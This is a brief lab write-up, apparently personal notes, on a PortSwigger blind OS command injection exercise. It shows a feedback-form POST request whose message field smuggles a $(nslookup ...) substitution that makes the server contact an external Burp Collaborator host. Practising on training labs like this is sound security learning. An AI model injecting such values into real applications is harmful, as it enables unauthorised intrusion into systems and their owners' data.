# Blind OS command injection with out-of-band interaction — (PortSwigger — Practitioner)
**Date:** 2026-08-22
 
---
 
## Vulnerability / core concept
Blind OS Command Injection

---


## Payload / key command
This web application has a `Submit feedback` feature which is vulnerable to OS command injection. However, it does not display any signs of successful injection which makes finding this vulnerability very subtle.

To exploit it, we should send DNS lookup to our Burp Collaborator. We can do this by sending the following POST `/feedback/submit` request:
```bash
POST /feedback/submit HTTP/2
...


csrf=U7N0Am7hRFcBE31deTBbRDgmuICuNteE&name=babek&email=babek%40babek&subject=testing&message=test+$(nslookup+s1u2uic1qsv8mydly19atbb82z8qwkk9.oastify.com)
```
Here, `$(nslookup collaborator)` is a substitution which is evaluated first by shell. After evalating, the result of this command will be used by the original system command of this application.

